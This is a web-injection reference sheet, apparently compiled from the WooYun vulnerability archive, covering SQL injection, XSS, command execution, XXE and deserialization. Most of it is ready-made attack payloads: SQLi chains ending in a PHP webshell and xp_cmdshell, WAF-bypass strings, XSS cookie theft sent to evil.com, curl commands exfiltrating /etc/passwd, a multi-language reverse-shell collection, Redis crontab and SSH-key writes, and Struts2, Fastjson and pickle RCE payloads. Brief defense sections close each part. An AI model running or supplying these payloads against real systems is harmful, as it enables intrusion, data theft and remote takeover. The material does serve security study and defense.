# Web Injection Security

> Distilled from the WooYun database's knowledge base of the three main injection types: SQL injection (27,732 cases), XSS (7,532 cases), command execution (6,826 cases)
> Data source: wooyun_vulnerabilities.json (88,636 vulnerability records, 2010-2016)
> This document is for security research and defense reference only

---

## 1. SQL Injection

### 1.1 Nature of the Vulnerability

```
Missing input validation → dynamic SQL concatenation → semantic-boundary breach → database command execution
```

**Core formula**: SQL injection = confusion of the code/data boundary + user input elevated into executable SQL

### 1.2 Detection Method

#### High-Risk Injection-Point Identification

| Vector type | share | typical scenario |
|---------|------|---------|
| Login form | 66% | username/password directly concatenated |
| Search box | 64% | LIKE-statement fuzzy matching |
| POST parameters | 60% | form submission |
| HTTP headers | 26% | UA/Referer/XFF |
| GET parameters | 24% | URL parameters |
| Cookie | 12% | session-identifier handling |

**High-frequency parameter names**: `id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`; ASP.NET-specific: `__viewstate`, `__eventvalidation`

#### Quick Detection Flow

```
1. Single-/double-quote test → observe errors
2. Arithmetic: id=2-1 / id=1*1 → observe equivalence
3. Boolean test: and 1=1 / and 1=2 → compare response differences
4. Time delay: and sleep(5) → observe the response time
5. Column probing via sorting: order by N → increment until an error
```

#### Database Fingerprinting

| Database | delay function | system table | error signature |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | Cartesian-product delay | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 Injection Techniques and Payloads

#### Boolean-Based Blind Injection

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### Time-Based Blind Injection

```sql
-- MySQL (nested-delay field technique)
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### Union Query

```sql
id=1 ORDER BY N--              -- probe the column count
id=-1 UNION SELECT 1,2,3,4,5--  -- determine the echo position
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Error-Based Injection

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- Use the CHAR function to bypass character filtering
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/Filter Bypass Techniques

#### Inline Comments (most common)

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMS bypass example
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### Encoding Bypass

```sql
-- Hex: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URL double encoding: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### Case + Whitespace Substitution

```sql
UnIoN SeLeCt                    -- case obfuscation
UNION/**/SELECT/**/1,2,3        -- comments instead of spaces
UNION%09SELECT                  -- Tab substitution
UNION%0ASELECT                  -- newline substitution
```

#### Function Substitutes

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> character A
```

#### Logically-Equivalent Substitution

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- Quote bypass
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### Wide-Byte Injection (GBK encoding)

```
%bf%27 bypasses addslashes()   -- under GBK a multibyte character swallows the backslash
```

#### HTTP-Layer Bypass

```
Parameter pollution: id=1&id=2             -- duplicate-parameter confusion
Chunked transfer: Transfer-Encoding: chunked
X-Forwarded-For injection / Cookie injection  -- unconventional injection points
```

### 1.5 Exploitation Chain

#### Complete MySQL Exploitation Chain

```sql
-- 1. info -> 2. database -> 3. table -> 4. column -> 5. data -> 6. file -> 7. shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### Complete MSSQL Exploitation Chain

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- Command execution (requires sa privileges)
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracle Exploitation Chain

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Access Blind-Injection Exploitation Chain

```sql
-- No information_schema; obtain the source or guess table names
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- Use NOT IN for multi-user enumeration
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 Defenses

```python
# Parameterized query (preferred)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- Parameterized queries / prepared statements (preferred), stored procedures (secondary)
- Whitelist input validation + forced type conversion for numeric parameters
- Database least privilege + hidden error messages + WAF deployment

---

## 2. XSS (Cross-Site Scripting)

### 2.1 Nature of the Vulnerability

```
User input (data) -> unencoded output -> the browser parses it as code -> script executes
```

**Core formula**: XSS = trust-boundary breach + output-context confusion (data changes meaning across HTML/JS/CSS/URL)

### 2.2 Detection Methods

#### High-Risk Output Points

| Output point | trigger condition | typical scenario |
|-------|---------|---------|
| User nickname/signature | page load | profile page, comments, friend list |
| Search-box echo | a search operation | the search-results page |
| Comments/messages | content display | forums, blogs, product reviews |
| Filename/description | file list | cloud drive, photo album |
| Email body/subject | opening the email | webmail system |
| Order notes | viewed in the admin panel | e-commerce admin, ticketing system |

**Hidden output points** (easily missed): HTTP headers (XFF/UA written to logs), WAP-submitted content shown on PC, client-side nickname rendered on the web, drafts / review lists

#### Quick Context Determination

```
Output inside <script>? -> JS context (check the quote type)
Output in an attribute value? -> attribute context (check the attribute type)
Output in tag content? -> HTML context (check special tags textarea/title)
Output in a URL? -> URL context (check protocol restrictions)
Output in CSS? -> CSS context (check expression support)
```

### 2.3 Context-Specific Payloads

#### HTML Tag Content

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTML Attribute Value

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScript String

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL Context

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/Filter Bypass Techniques

#### Encoding Bypass

```html
<!-- HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + data protocol -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSS encoding (IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Tag/Attribute Mutation

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- case obfuscation -->
<script/src=//xss.com/x.js>            <!-- slash instead of space -->
<img src=x onerror=alert(1)>           <!-- no quotes -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- double-write bypass -->
<scr\x00ipt>alert(1)</script>          <!-- null-character bypass -->
```

#### Alternative Event Handlers

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAF-Specific Bypass

```html
.<script src=http://localhost/1.js>.    <!-- Anquanbao: add dots before and after -->
<!--[if true]><img onerror=alert(1) src=--> <!-- comment interference -->
```

#### Length-Limit Bypass

```html
<script src=//xss.pw/j>                <!-- shortest external load -->
<!-- DOM concatenation -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- string concatenation to bypass the keyword -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnly Bypass

- A Flash interface retrieves user info in place of cookies
- Turn it into CSRF: directly perform sensitive operations (change password, add admin, read token)

### 2.5 Exploitation Chain

#### Cookie Theft

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### Key DOM-XSS Sources and Sinks

**Dangerous sources**: `location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**Dangerous sinks**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### Core Logic of an XSS Worm

```javascript
// 1. get the current user identity (cookie/token)
// 2. build content containing the payload itself
// 3. auto-publish/share (AJAX POST)
// 4. trigger: viewing/visiting spreads it
function worm(){
    jQuery.post("/api/post", {"content": "<self-propagating payload>"})
}
worm()
```

#### Combined-Exploitation Patterns

```
XSS + CSRF -> obtain the token and perform admin operations
XSS + SQLi -> blind XSS to obtain the cookie -> back-end injection
XSS -> account hijacking -> privilege escalation -> worm propagation
Blind XSS (messages/tickets/feedback) -> obtain the admin's cookie
```

### 2.6 Defenses

- **Output encoding** (core): HTML entities in HTML context, JS encoding in JS context, URL encoding in URL context
- The CSP policy restricts script sources
- HttpOnly protects the cookie
- Whitelist input validation (avoid blacklists, which always miss something)
- **Common mistakes**: filtering only the script tag, filtering only lowercase, front-end filtering bypassed by intercepting, single-pass filtering bypassed by double-writing

---

## 3. Command Execution

### 3.1 Nature of the Vulnerability

```
User input (data) -> unsanitized concatenation -> enters a system-command/code-execution context -> OS command executes
```

**Core formula**: Command execution = data-flow tainting + an execution context (shell/code/expression)

### 3.2 Detection Methods

#### High-Frequency Entry Points

| Entry type | share | typical scenario |
|---------|------|---------|
| File operations | 68% | upload, read, extract |
| System-command functions | 62% | exec/system/shell_exec |
| Struts2 framework | 50% | OGNL expression injection |
| SSRF | 30% | passed via URL parameters |
| ping command | 26% | network-diagnostics feature |
| Image processing | 24% | ImageMagick |
| Java deserialization | 20% | WebLogic/JBoss |

#### Command-Chaining Symbols

| Symbol | meaning | execution logic |
|------|------|---------|
| `;` | separator | run sequentially, regardless of the previous command's result |
| `\|` | pipe | the first's output becomes the second's input |
| `` ` `` / `$()` | command substitution | run the inner command and return its result |
| `\|\|` | logical OR | the second runs only if the first fails |
| `&&` | logical AND | the second runs only if the first succeeds |
| `%0a` / `%0d%0a` | newline | URL-encoded newline separator |

#### No-Echo Detection

```bash
# DNSLog out-of-band exfiltration
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTP out-of-band exfiltration
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# Time delay
sleep 5
ping -c 5 127.0.0.1

# Write a file into the web directory
echo "test" > /var/www/html/proof.txt
```

### 3.3 Bypass Techniques

#### Space Bypass

```bash
cat${IFS}/etc/passwd          # ${IFS} is the internal field separator
cat$IFS$9/etc/passwd          # $9 is an empty positional parameter
cat%09/etc/passwd             # Tab character
cat</etc/passwd               # redirection operator
{cat,/etc/passwd}             # brace expansion
```

#### Keyword Bypass

```bash
# Quote / backslash splitting
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable concatenation
a=c;b=at;$a$b /etc/passwd

# Wildcard
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### cat-Command Substitutes

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Encoding Bypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 Exploitation Chain and Payloads

#### Framework/Component Vulnerability Payloads

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNL Generic Command Execution**:

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovy Sandbox Bypass**:

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redis Unauthorized Write of SSH Key / Crontab**:

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# or write to crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### Reverse-Shell Collection

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# nc without the -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHP Dangerous-Function Tiers

| Tier | functions | capability |
|-----|------|-----|
| L1 code level | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHP code execution |
| L2 shell level | `system()`, `passthru()`, `shell_exec()`, backticks | system commands with echo |
| L3 process level | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | child-process execution |
| L4 callback level | `call_user_func()`, `array_map()` | indirect function calls |

#### PHP WAF-Bypass Techniques

```php
// string concatenation
$func = 'sys'.'tem'; $func('whoami');
// variable function
$a='sys';$b='tem';($a.$b)('whoami');
// encoding obfuscation
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// string operations
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functions Bypass

| Method | principle | condition |
|-----|------|-----|
| LD_PRELOAD | hijack system-library functions; mail() triggers loading a malicious .so | can upload a .so + mail() is available |
| Shellshock | Bash<=4.3 environment-variable injection | old Bash versions |
| Apache Mod_CGI | .htaccess configures CGI execution | Apache + AllowOverride |
| PHP-FPM/FastCGI | modify PHP config to execute code | can reach the FPM port / SSRF |
| ImageMagick | command execution via the delegate feature | uses IM to process images |
| Windows COM | the WScript.Shell component | Windows + COM extension |

**Core LD_PRELOAD Exploitation**:

```php
// upload a malicious .so (hijack the geteuid function, which internally calls system())
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail() starts the sendmail process -> loads the .so -> executes the command
```

### 3.5 Defenses

```php
// best practice: whitelist validation + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Avoid calling system commands directly; use built-in language functions instead
- Parameterized execution (array arguments); no string concatenation
- `escapeshellarg()` + `escapeshellcmd()` escaping
- Whitelist input validation + type checking
- `disable_functions` disables dangerous functions (mind the bypass risk)
- Run the web service with least privilege + container/chroot isolation
- Promptly update framework components (Struts2/WebLogic/ImageMagick, etc.)

---

## 4. XXE (XML External Entity Injection)

### 4.1 Nature of the Vulnerability

```
XML input -> the parser has DTD/external entities enabled -> entity references are resolved and executed -> file read / SSRF / RCE
```

**Core formula**: XXE = the XML parser allows external-entity references + user-controlled XML input

### 4.2 Detection Methods

**High-Risk Entry-Point Identification**

| Entry type | detection signature | typical scenario |
|----------|----------|----------|
| API endpoint | Content-Type contains `text/xml` or `application/xml` | RESTful API, SOAP web service |
| File upload | SVG images, DOCX/XLSX/PPTX (essentially ZIP containing XML) | avatar upload, document import |
| Data parsing | XML config import, RSS/Atom subscriptions | admin panel, aggregation features |
| Protocol interaction | SAML authentication, WebDAV, XMPP | SSO login, file management |

**Quick Detection Flow**

```
1. Identify an XML-processing endpoint → change Content-Type to application/xml to test
2. Send a basic DTD declaration → observe whether it is parsed (error differences)
3. Try an external-entity reference → read a known file via the file protocol
4. When there is no echo → OOB exfiltration (DNS/HTTP callback)
```

### 4.3 Classic Payloads

#### File Read (with echo)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRF Internal-Network Probing

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Blind Injection - OOB Data Exfiltration

```xml
<!-- external DTD (the attacker's server hosts evil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd content: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Error-Based Echo

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 Bypass Techniques

| Bypass | method | applicable scenario |
|----------|------|----------|
| Encoding bypass | UTF-16BE/LE, UTF-7-encoded XML | when the WAF matches on ASCII patterns |
| Parameter-entity nesting | `%entity;` instead of `&entity;` | when general entity `&` is filtered |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | when you cannot control the DOCTYPE declaration |
| SVG embedding | embed an XXE entity inside an SVG file | only image uploads allowed |
| DOCX/XLSX embedding | modify `[Content_Types].xml` inside the Office document | document-upload feature |
| CDATA wrapping | use a CDATA section to bypass special-character restrictions | read files containing XML special characters |

### 4.5 Defenses

```java
// Java: disable DTD and external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- Disable DTD processing and external-entity resolution (preferred)
- Use JSON instead of XML for data exchange
- Whitelist-validate input; upgrade the XML-parsing library
- WAF rules block the `<!DOCTYPE`/`<!ENTITY`/`SYSTEM` keywords

---

## 5. Deserialization Vulnerabilities

### 5.1 Nature of the Vulnerability

```
Serialized data (untrusted) -> deserialization function -> object reconstruction triggers magic methods/callbacks -> malicious logic executes
```

**Core formula**: Deserialization RCE = controllable serialized input + a dangerous class on the classpath/in scope + a reachable gadget chain

### 5.2 Java Deserialization

**Detection Markers**

```
Binary stream: AC ED 00 05 (hex header)
Base64:   rO0AB (encoded header)
Common locations: Cookie, ViewState, JMX, RMI, the T3 protocol, the HTTP body
```

**Exploitation-Chain Quick Reference**

| Exploitation chain | dependency | trigger method | tool |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | manual / dedicated tool |
| Jackson | jackson-databind | polymorphic deserialization | ysoserial |
| JNDI injection | JDK < 8u191 | LDAP/RMI remote class loading | JNDIExploit/marshalsec |

**Classic Fastjson Payload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 cache bypass
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**Toolchain**

```bash
# ysoserial generates the payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDI injection service
java -jar JNDIExploit.jar -i attacker_ip

# marshalsec starts a malicious LDAP/RMI server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHP Deserialization

**Detection Markers**

```
Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
Key functions: unserialize(), triggered by the phar:// wrapper
```

**Magic-Method Exploitation Chain**

| Method | trigger timing | exploitation method |
|------|----------|----------|
| `__wakeup()` | when unserialize() is called | property overwrite → dangerous operation |
| `__destruct()` | on object destruction | file delete/write / command execution |
| `__toString()` | when an object is used as a string | concatenated into a dangerous function |
| `__call()` | calling a nonexistent method | a pivot for chained calls |

**POP-Chain Construction Approach**

```
1. Find the entry point: a method calling a $this->xxx property inside __wakeup()/__destruct()
2. Pivot: chain to other classes via __toString()/__call()/__get()
3. Endpoint: reach a dangerous function such as system()/eval()/file_put_contents()
4. Construction: control property values to fully connect the chain
```

**Phar Deserialization (no unserialize call needed)**

```php
// a file-operation function triggers phar:// deserialization
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // disguised with an image extension
```

### 5.4 Python Deserialization

**Dangerous Functions**

```python
import pickle, yaml, marshal

# pickle - most common
pickle.loads(data)      # deserialize
pickle.load(file)       # deserialize from a file

# yaml - requires a Loader
yaml.load(data)         # unsafe by default (old versions)
yaml.load(data, Loader=yaml.FullLoader)  # restricted loading

# marshal - bytecode level
marshal.loads(data)     # loads a code object
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Equivalent manual construction:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# or
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 Defenses

```java
// Java: ObjectInputStream whitelist filtering
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: upgrade components (Fastjson/Jackson/Commons-Collections), disable autoType, use a whitelist deserialization filter
- **PHP**: avoid unserialize() on user input, use json_decode instead, disable the phar:// wrapper
- **Python**: use `yaml.safe_load()` instead of `yaml.load()`, never pickle untrusted data, use JSON
- **General**: avoid transmitting data in native serialization formats, use JSON consistently; apply signature/HMAC validation on deserialization entry points

---

## Appendix: SQLMap Quick Reference

```bash
# Basic detection
sqlmap -u "http://t/p.php?id=1" --batch
# POST request
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie / HTTP-header injection
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# Bypass the WAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# Data-extraction chain
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
